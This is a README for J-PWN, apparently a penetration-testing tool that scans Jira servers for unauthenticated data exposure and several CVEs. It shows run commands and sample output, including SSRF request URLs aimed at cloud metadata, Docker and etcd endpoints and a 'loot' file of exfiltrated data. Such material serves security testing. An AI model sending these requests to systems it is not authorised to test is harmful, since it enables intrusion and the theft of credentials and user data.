# J-PWN
Jira Vulnerability Enumeration 
```
             ██╗      ██████╗ ██╗    ██╗███╗   ██╗
             ██║      ██╔══██╗██║    ██║████╗  ██║
             ██║█████╗██████╔╝██║ █╗ ██║██╔██╗ ██║
        ██   ██║╚════╝██╔═══╝ ██║███╗██║██║╚██╗██║
        ╚█████╔╝      ██║     ╚███╔███╔╝██║ ╚████║
         ╚════╝       ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
         ** Hack the Planet ** [carnal0wnage]
```


## Wiki
There is an extensive wiki at [https://github.com/carnal0wnage/J-PWN/wiki](https://github.com/carnal0wnage/J-PWN/wiki)



## Quickstart 
### Install
```
python3  -m venv j-pwn
source j-pwn/bin/activate
pip3 install -r requirements
```
### Running J-PWN
`python3 j-pwn.py --single http://5.6.7.8:8080`

`python3 j-pwn.py --single https://1.2.3.4 -p /jira/` (jira path added)

`python3 j-pwn.py --list ../jira-hosts.txt`

`python3 j-pwn.py --single http://1.2.3.4:8080 --module check_open_jira_signup` (run a single module against a host)

### Example Data

Returns JIRA server version if JIRA is identified

```
+ JIRA is running on: https://jira1 

JIRA Server Information:
  Base URL        : https://jira1/jira
  Version         : 7.1.9
  Deployment Type : Server
  Build Number    : 71013
  Build Date      : 2016-06-27T00:00:00.000-0400
  Server Title    : JIRA

+ JIRA is running on: https://jira2

JIRA Server Information:
  Base URL        : https://jira2/jira
  Version         : 8.8.1
  Deployment Type : Server
  Build Number    : 808001
  Build Date      : 2020-04-22T00:00:00.000-0400
  Server Title    : Systems JIRA
```

### List the data if a JIRA server is vulnerable

ex: Unauthenticated Access to JIRA Admin Projects Detected
```
+ Unauthenticated Access to JIRA Admin Projects Detected
  URL: https://jira3/jira/rest/menu/latest/admin

  Admin Projects Details:
    - Key: admin
      Link: https://jira3/jira/secure/project/ViewProjects.jspa
      Label: JIRA administration
      Tooltip: 
      Local: True
      Self: True
      Application Type: jira
```
ex: Unauthenticated Access to JIRA Dashboards
```
+ Unauthenticated Access to JIRA Dashboards Detected
  URL: https://jira4/jira/rest/api/2/dashboard?maxResults=100
  Start At: 0
  Max Results: 100
  Total Dashboards: 1

  Dashboard Details:
    - ID: 10000
      Name: System Dashboard
      API URL: https://jira4/jira/rest/api/2/dashboard/10000
      View URL: https://jira4/jira/secure/Dashboard.jspa?selectPageId=10000
```
ex: Unauthenticated Access to JIRA Project Categories
```
+ Unauthenticated Access to JIRA Project Categories Detected
++ Manually check these for Unauthenticated Access ++
  URL: https://jira5/jira/rest/api/2/projectCategory?maxResults=1000

  Project Categories Details:
    - ID: 10003
      Name: Delivered
      Description: Project Delivered 
      API URL: https://jira5/jira/rest/api/2/projectCategory/10003
    - ID: 10400
      Name: Development
      Description: Development
      API URL: https://jira5/jira/rest/api/2/projectCategory/10400
    - ID: 10201
      Name: Internal
      Description: 
      API URL: https://jira5/jira/rest/api/2/projectCategory/10201
```

ex: CVE-2019-3403
```
+ CVE-2019-3403 Detected
  URL: https://jira3/jira/rest/api/2/user/picker?query=admin
  Total Users Found: 0
  Header: Showing 0 of 0 matching users
  User Details: No users listed.
```
ex: CVE-2019-8449
```
+ CVE-2019-8449 Detected
  URL: https://jira3/jira/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
  Total Users Found: 0
  User Header: Showing 0 of 0 matching users
  User Details: No users listed.
  Total Groups Found: 0
  Group Header: Showing 0 of 0 matching groups
  Group Details: No groups listed.
```

ex: CVE-2019-8442
```
- Checking URL: https://jira3/jira/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
- HTTP Status Code: 200
+ CVE-2019-8442 Detected: Information Disclosure vulnerability found!
  URL: https://jira3/jira/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml

- Checking URL: https://jira3/jira/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml
- HTTP Status Code: 200
+ CVE-2019-8442 Detected: Information Disclosure vulnerability found!
  URL: https://jira3/jira/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml
```

ex: CVE-2019-8451
```
INFO: IN DEVELOPMENT Checking for CVE-2019-8451 (SSRF)
[Testing URL]: http://JIRASERVER:8080/plugins/servlet/gadgets/makeRequest?url=http://JIRASERVER:8080@example.com
[!!] [SSRF] Vulnerable to CVE-2019-8451 (SSRF): http://JIRASERVER/plugins/servlet/gadgets/makeRequest?url=http://JIRASERVER:8080@example.com
	Checking AWS Metadata
	----> AWS Metadata Not Found HTTP:500 
	----> HTTP Code: 200
throw 1; < don't be evil' >{"http://JIRASERVER:8080@169.254.169.254/latest/meta-data/":{"rc":500,"headers":{},"body":""}}
	Checking Alibaba Metadata
	----> Alibaba Metadata FOUND: http://JIRASERVER:8080/plugins/servlet/gadgets/makeRequest?url=http://JIRASERVER:8080@100.100.100.200/latest/meta-data/
	Checking Docker Containers
	----> Docker Containers Not Found HTTP:500 
	----> HTTP Code: 200
throw 1; < don't be evil' >{"http://JIRASERVER:8080@127.0.0.1:2375/v1.24/containers/json":{"rc":500,"headers":{},"body":""}}
	Checking Kubernetes ETCD API keys
	----> Kubernetes ETCD API keys Not Found HTTP:500 
	----> HTTP Code: 200
throw 1; < don't be evil' >{"http://JIRASERVER:8080@127.0.0.1:2379/v2/keys/?recursive=true":{"rc":500,"headers":{},"body":""}}
	Checking Digital Ocean Metadata
	----> Digital Ocean Metadata Not Found HTTP:500 
	----> HTTP Code: 200
throw 1; < don't be evil' >{"http://JIRASERVER:8080@169.254.169.254/metadata/v1.json":{"rc":500,"headers":{},"body":""}}
	Checking Oracle Cloud
	----> Oracle Cloud Not Found HTTP:500 
	----> HTTP Code: 200
throw 1; < don't be evil' >{"http://JIRASERVER:8080@192.0.0.192/latest/user-data/":{"rc":500,"headers":{},"body":""}}
	Checking Tencent Cloud
	----> Tencent Cloud Not Found HTTP:500 
	----> HTTP Code: 200
throw 1; < don't be evil' >{"http://JIRASERVER:8080@metadata.tencentyun.com/latest/meta-data/":{"rc":500,"headers":{},"body":""}}

Exfiltrated data written to: loot/CVE-2019-8451_JIRASERVER:8080.txt
```
